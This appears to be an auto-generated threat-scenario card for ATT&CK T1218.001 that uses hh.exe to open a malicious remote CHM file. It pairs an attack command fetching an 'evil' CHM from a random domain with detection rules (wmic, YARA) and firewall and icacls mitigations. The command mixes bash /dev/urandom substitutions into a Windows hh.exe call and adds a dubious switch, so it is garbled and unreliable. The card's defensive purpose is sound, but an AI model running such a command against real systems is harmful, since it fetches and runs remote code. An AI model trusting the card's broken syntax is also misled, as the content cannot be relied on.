---
type: campaign
scenario_id: 186
tactic: Defense Evasion
technique: "T1218.001: Compiled HTML File"
technique_id: T1218.001
tags: [campaign, lotl, defense_evasion]
---

# Using hh.exe to execute malicious CHM file remotely.

## Threat Description
Using hh.exe to execute malicious CHM file remotely.

## Attack Command
```
hh http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor hh remote: `wmic process where name='hh.exe' get commandline | findstr http`; YARA rule: `rule HhRemoteChm { strings: $a = /hh.*http.*chm/ nocase; condition: $a }`.

## Mitigation
Restrict hh: `icacls %windir%\hh.exe /deny Everyone:RX`; Block CHM downloads: `netsh advfirewall firewall add rule name='Block hh' dir=out program='%windir%\hh.exe' action=block`.

## AI Training Prompt
Train AI to detect hh remote CHM execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
